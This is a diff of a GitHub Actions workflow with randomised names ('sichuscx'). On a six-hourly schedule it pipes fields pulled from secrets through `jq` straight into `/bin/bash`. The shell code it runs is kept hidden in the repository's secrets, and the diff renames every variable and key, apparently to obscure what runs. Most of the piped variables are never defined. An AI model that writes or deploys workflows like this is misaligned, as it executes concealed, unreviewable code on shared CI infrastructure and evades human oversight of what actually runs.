@@ -1,25 +1,21 @@
 name: sichuscx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 2/6 * * *'
+    - cron: '15 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sichuscx
         env:
-          le42: ${{ secrets.le42 }}
+          cwk84923: ${{ secrets.cwk84923 }}
         run: |
-          echo $le42 | jq -r .pgca35160 | /bin/bash
-          echo $in102 | jq -r .jxfy3 | /bin/bash
-          echo $jwrdc50 | jq -r .mqe8631 | /bin/bash
-          echo $ohb392 | jq -r .irr6828 | /bin/bash
-          echo $riqn59416 | jq -r .e7748 | /bin/bash
-          echo $erqro14 | jq -r .rziw703 | /bin/bash
-          echo $okuku728 | jq -r .bn5 | /bin/bash
-          echo $t29462 | jq -r .x02752 | /bin/bash
-          echo $s178 | jq -r .qd18789 | /bin/bash
+          echo $cwk84923 | jq -r .dfq0 | /bin/bash
+          echo $cmozs41068 | jq -r .xp57 | /bin/bash
+          echo $upgn20135 | jq -r .rrgi82134 | /bin/bash
+          echo $dru24099 | jq -r .dr58225 | /bin/bash
+          echo $tsnxy739 | jq -r .z743 | /bin/bash
 
